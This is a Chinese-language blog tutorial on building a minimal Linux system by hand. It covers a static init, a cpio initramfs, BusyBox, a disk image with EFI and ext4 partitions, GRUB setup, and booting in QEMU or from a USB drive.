#先直接编译gcc shell.c#生成一个a.outldd  ./a.out # 查看这个文件动态链接了那些库，可以看到有一个# libc.so.6 =&gt; lib/x86_64-linux-gnu/libc.so.6# 这个就是动态链接，因此我们添加一个编译参数-static把所有动态库打包到一个执行文件中gcc shell.c -staticmv a.out init # 改名# 将a.out用cpio打包成启动linux内核专门使用的initecho &quot;init&quot; | cpio -H newc -o &gt; init.cpio# 执行一遍qemu-system-x86_64 -kernel linux-6.17.3/arch/x86/boot/bzImage -initrd init.cpio


解释为什么要用cpio打包在 Linux 启动过程中，内核会加载一个临时根文件系统（initramfs 或 initrd），它通常是一个 cpio 打包的归档文件。cpio 是一种打包工具，常用于制作 Linux 的 initramfs 等文件系统镜像，因为内核能直接识别并解压它。
cpio -H newc -o-o：表示 “copy out”，即创建打包文件；-H newc：指定输出格式为 newc（一种常用于 initramfs 的新 ASCII 格式，支持大文件与设备号）；cpio 会根据输入的文件名列表（这里是 &quot;init&quot;）把对应文件打包输出到标准输出。

构建一个完整的linux发行版首先，一个完整的linux需要一个内核，一个shell，一个bootloader，一个根文件系统。
busyboxBusyBox 是一个把众多常用 Linux 命令集成到单一可执行文件中的轻量级工具集合，被称为 “嵌入式 Linux 的瑞士军刀”。从网站中下载出busybox然后解压，执行一些编译操作。具体内容请直接看视频。这里只说几个具体的指令make menuconfig 打开配置菜单并关闭tc选项
然后就将解压后的内容安装到一个文件夹下备用。make install CONFIG_PREFIX=you_dir
构建一个根文件系统sudo dd if=/dev/zero of=/linux.img bs=1M count=512 #构建一个文件，内容全为0，共有512MB# 使用gdisk编辑这个文件，把他构建成一个虚拟磁盘，然后分两个区，一个EFI引导分区，一个数据分区。具体操作请接着看视频吧，这些部分用文字来的并不如视频直接。# 当你完成两个分区的创建后，可以对这两个分区进行格式化并配置其内容

要对这个两个分区进行格式化，首先先使用losetup把他们模拟成磁盘
losetup 是用于管理环回设备（loop device）的命令。环回设备允许你把一个普通文件（例如镜像文件 linux.img）当作一个块设备使用，就像一块真正的磁盘一样，这样你就可以对它进行挂载、分区操作等losetup -f -P linux.img-f表示自动查找空闲的 loop 设备-P会告诉 losetup 在建立环回设备时自动扫描镜像中的分区表，并为每个分区创建对应的设备节点。执行后，会生成一个loop设备。
# 查看设备lsblk # 可以查看到一个512M的loop磁盘，分成了两个49MB和480MB的分区。# 对这两个分区进行格式化mkfs.fat F32 /dev/loop13p1 # 将第一个EFI分区格式化为32分区mkfs.ext4 /dev/loop13p2 # 将数据分区变为ext4格式# 新建一个mnt目录，并把EFI分区挂载到这个目录上mkdir mnt &amp;&amp; mount /dev/loop13p1 mnt

使用grub-install配置引导分区执行下面的命令把grub安装到EFI分区中。
grub-install --target=x86_64-efi --efi-directory=$(realpath mnt) --bootloader-id=GRUB --removable --recheck

配置grub.cfg修改grub.cfg并复制一份到boot&#x2F;grub下，避免因不同硬件的原因导致的引导失败。
# 修改grub.cfgvim mnt/EFI/BOOT/grub.cfg# 主要将其中的uuid进行更改，修改成你对应的数据盘的uuid，可以使用下面的命令查询你的第二个分区的uuidblkid /dev/loop13p2 # 然后将对应的uuid复制并修改原来的cfg中uuid的部分# 然后复制到另一目录mkdir mnt/boot/grub/grub.cfg# 然后卸载该分区umount mnt

然后配置数据分区主要是这几个内容。

将busybox移动进去
把bzImage移动进去
设置对应的grub.cfg(与引导分区的grub不一样)
添加对应的init文件

前两个步骤无需多言，稍微注意一点，在mnt中新建一个boot文件夹，然后将bzImage移动到这个boot文件夹下，busybox直接放在mnt目录下即可。
然后在boot中新建一个grub目录，然后创建grub.cfg文件
menuentry &quot;xiaohe_linux&quot; &#123;    insmod part_gpt    insmod fat    insmod ext2    insmod normal    search --no-floppy --fs-uuid --set=root 你的数据盘UUID    linux /boot/bzImage root=PARTUUID=你的数据盘PARTUUID rw init=/boot/init rootdelay=3&#125;

uuid和part_uuid都是通过blkid来获取的，可以很直观的看到。
接着在boot目录下创建一个init文件，内容如下
!/bin/shmount -t sysfs none /sysmount -t proc none /procmount -t devtmpfs devtmpfs devexec /bin/sh


事后别忘了给init添加执行权限，即chmod +x init

然后在mnt目录下创建出sys,proc,dev目录，用来再后面启动时进行装载。
以上，完成这些步骤后，基本就算构建好了一个可运行的最小linux开发版本。
启动一次退出mnt目录，然后将这个磁盘卸载并脱机
cd ../ # 回到原本的目录umount mntlosetup -d /dev/loop13 # 使用qemu-system再模拟执行一遍qemu-system-x86_64 -drive file=./linux.img -bios /usr/share/ovmf/OVMF.fd -m 1G -serial stdio

接着应该就可以看到正常的界面展示了
将虚拟磁盘装载到U盘上# 这里你需要判断一下你插入的U盘是什么名字，因为dd指令会把u盘格式化，别格式化错了文件lsblk | grep sd # 可以查看sd开头的磁盘名，你需要通过磁盘大小判断那个才是你的U盘dd if=linux.img of=/dev/sdb

然后就可以直接插在电脑上当作正常启动盘来使用了。

我在这里还遇到了一个问题目前还没能解决，因为我也才刚刚实现。

]]></content>
      <tags>
        <tag>linux内核</tag>
        <tag>手搓</tag>
      </tags>
  </entry>
</search>
